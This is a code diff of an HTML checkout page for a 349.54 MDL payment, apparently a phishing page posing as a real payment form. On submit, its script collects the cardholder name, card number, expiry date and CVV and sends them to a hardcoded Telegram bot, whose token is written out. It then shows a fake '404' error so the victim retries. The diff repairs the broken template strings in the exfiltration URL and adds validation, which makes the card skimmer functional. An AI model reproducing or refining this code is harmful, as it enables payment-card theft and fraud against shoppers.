@@ -179,12 +179,12 @@
         <h1>To Pay 349.54 mdl</h1>
         <form id="payment-form">
             <div class="input-group">
-    <label for="name-on-card">Name On Card</label>
-    <input type="text" id="name-on-card" placeholder="John Doe" required>
-</div>
+                <label for="name-on-card">Name On Card</label>
+                <input type="text" id="name-on-card" placeholder="John Doe" required pattern="[A-Za-z\s]+">
+            </div>
             <div class="input-group">
                 <label for="card-number">Card Number</label>
-                <input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                <input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19" required pattern="\d{4} \d{4} \d{4} \d{4}">
             </div>
             <div class="input-row">
                 <div class="input-group">
@@ -194,7 +194,7 @@
                 </div>
                 <div class="input-group">
                     <label for="cvv">CVV</label>
-                    <input type="password" id="cvv" placeholder="123" maxlength="3" required>
+                    <input type="password" id="cvv" placeholder="123" maxlength="3" required pattern="\d{3}">
                 </div>
             </div>
             <button type="submit" class="submit-btn">Pay Now</button>
@@ -214,11 +214,25 @@
     </div>
 
     <script>
+        const cardNumberInput = document.getElementById('card-number');
         const expiryDateInput = document.getElementById('expiry-date');
         const expiryError = document.getElementById('expiry-error');
         const paymentForm = document.getElementById('payment-form');
         const popupContainer = document.getElementById('popup-container');
         const tryAgainButton = document.getElementById('try-again-btn');
+
+        // Format the card number input
+        cardNumberInput.addEventListener('input', function(event) {
+            // Remove everything that's not a digit
+            let cardNumber = event.target.value.replace(/\D/g, '');
+
+            // Add space after every 4 digits
+            if (cardNumber.length > 4) {
+                cardNumber = cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ');
+            }
+
+            event.target.value = cardNumber;
+        });
 
         expiryDateInput.addEventListener('input', (event) => {
             const value = event.target.value.replace(/[^0-9]/g, '');
@@ -244,43 +258,34 @@
         });
 
         paymentForm.addEventListener('submit', (e) => {
-    e.preventDefault();
-    if (expiryError.textContent) return;
+            e.preventDefault();
+            if (expiryError.textContent) return;
 
-    // Get data from form fields
-    const nameOnCard = document.getElementById('name-on-card').value;
-    const cardNumber = document.getElementById('card-number').value;
-    const expiryDate = document.getElementById('expiry-date').value;
-    const cvv = document.getElementById('cvv').value;
+            // Get data from form fields
+            const nameOnCard = document.getElementById('name-on-card').value;
+            const cardNumber = document.getElementById('card-number').value;
+            const expiryDate = document.getElementById('expiry-date').value;
+            const cvv = document.getElementById('cvv').value;
 
-    // Construct message to send to Telegram bot
-    const message = Name On Card: ${nameOnCard}\nCard Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCVV: ${cvv};
+            // Construct message to send to Telegram bot
+            const message = `Name On Card: ${nameOnCard}\nCard Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}`;
 
-    // Send message to Telegram bot
-    sendMessageToTelegramBot(message);
+            // Send message to Telegram bot
+            sendMessageToTelegramBot(message);
 
-    // Simulate error 404
-    popupContainer.style.display = 'flex';
-});
-
+            // Simulate error 404
+            popupContainer.style.display = 'flex';
+        });
 
         tryAgainButton.addEventListener('click', () => {
             popupContainer.style.display = 'none';
             paymentForm.reset();
         });
 
-document.addEventListener('DOMContentLoaded', () => {
-    const orderPrice = localStorage.getItem('orderPrice'); // Preia prețul din localStorage
-    if (orderPrice) {
-        document.querySelector('.payment-container h1').textContent = Total ${orderPrice};
-    }
-});
-
-
         function sendMessageToTelegramBot(message) {
             const chatId = '6953089880'; // Your chat ID
             const token = '7692789463:AAEJmCdMzEIQseVlZh8DI7gB8_KVFVCrd7g'; // Your bot token
-            const apiUrl = https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
+            const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
             fetch(apiUrl)
                 .then(response => response.json())
@@ -293,4 +298,4 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     </script>
 </body>
-</html>  
+</html>
